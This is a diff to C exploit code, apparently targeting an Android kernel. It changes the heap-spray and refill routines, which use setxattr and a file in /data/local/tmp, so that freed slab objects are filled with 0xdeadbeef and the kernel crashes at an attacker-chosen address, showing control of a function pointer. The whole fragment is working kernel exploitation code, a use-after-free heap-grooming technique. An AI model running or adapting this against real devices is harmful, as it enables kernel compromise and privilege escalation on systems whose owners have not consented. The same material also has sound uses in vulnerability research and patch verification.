@@ -66,12 +66,23 @@ void handle_alarm(int sig) {
 int spray_fds[SPRAY_SIZE];
 
 /* 
+ * PAYLOAD CONFIGURATION
+ * 
+ * We use a fake object with a specific pattern to verify control.
+ * 0xdeadbeef is used as the target address to crash the kernel at a specific PC.
+ * This proves we control the function pointer.
+ */
+#define PAYLOAD_VAL 0xdeadbeef
+
+/* 
  * STEP 1: HEAP SPRAY (setxattr)
- * Fill the slab cache with CONTROLLED DATA (0x41414141).
+ * Fill the slab cache with CONTROLLED DATA.
  */
 void heap_spray_fill(void) {
     char payload[64];
-    memset(payload, 0x41, sizeof(payload)); // 'A'
+    // Fill with PAYLOAD_VAL to crash at specific address
+    unsigned int *p = (unsigned int*)payload;
+    for (int k = 0; k < 64/4; k++) p[k] = PAYLOAD_VAL;
 
     int fd = open("/data/local/tmp/spray_file", O_CREAT | O_RDWR, 0644);
     if (fd < 0) return;
@@ -130,9 +141,10 @@ void heap_groom_prepare(void) {
 } 
 
 void heap_refill_holes(void) {
-    // REFILL with setxattr to overwrite with 0x41414141
+    // REFILL with setxattr to overwrite with PAYLOAD_VAL
     char payload[64];
-    memset(payload, 0x41, sizeof(payload)); // 'A'
+    unsigned int *p = (unsigned int*)payload;
+    for (int k = 0; k < 64/4; k++) p[k] = PAYLOAD_VAL;
 
     int fd = open("/data/local/tmp/spray_file", O_CREAT | O_RDWR, 0644);
     if (fd < 0) return;
